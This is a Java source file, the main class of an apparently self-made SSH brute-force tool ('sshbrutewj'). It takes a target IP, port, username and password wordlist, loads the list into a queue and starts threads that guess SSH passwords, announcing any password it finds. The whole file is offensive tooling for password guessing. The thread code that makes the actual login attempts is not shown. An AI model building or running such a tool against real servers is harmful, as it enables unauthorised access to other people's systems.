package solirs.sshbrutewj;


/* ##---------IMPORTS---------#*/

import com.jcraft.jsch.*; //SSH library
import java.util.Queue;
import java.util.concurrent.locks.ReentrantLock;

import javax.swing.ProgressMonitorInputStream;

import java.io.IOException;
import java.util.LinkedList;
import java.util.List;
import java.io.FileInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Iterator;

/* ##---------IMPORTS---------#*/

public class Main
{
    private static List<SSHThread> threads = new LinkedList<SSHThread>();

    private static void loadwordlist() throws IOException {
        FileInputStream fstream = new FileInputStream(ProgramSettings.wordlist);
        BufferedReader br = new BufferedReader(new InputStreamReader(fstream));

        String line;

        while ((line = br.readLine()) != null)   {
            ProgramSettings.queue.add(line);
        }

        fstream.close();
    }

    public static void lockAllThreads() {
        ProgramSettings.lock.lock();
    }
    
    // this is just the same thing from the python script. I thought it looked
    // cool :~) - AyPle
    public static void outputText(String color, String text) {
        System.out.println(color + "\r[+]" + text);
    }

    public static void onPasswordCorrect(String password) {
        outputText(Colors.GREEN, "Password fount: " + password);
        System.exit(0);
    }

    public static void startNewThreads(int threadCount) {
        for (int i = 0; i < threadCount; i++) {
            SSHThread new_thread = new SSHThread();
            new_thread.start();
            threads.add(new_thread);
        }
    }

    public static void main( String[] args )
    {
        ProgramSettings.ip = args[0];
        ProgramSettings.port = Integer.valueOf(args[1]);
        ProgramSettings.username = args[2];
        ProgramSettings.wordlist = args[3];
        ProgramSettings.threadCount = Integer.valueOf(args[4]);
        //ProgramSettings.verboseMode = Boolean.valueOf(args[5]);



        try{
            loadwordlist();
            SSHThread sh = new SSHThread();
            sh.start();
            threads.add(sh);
        } catch(Exception j){
            System.out.print(j);
        }
    }
}
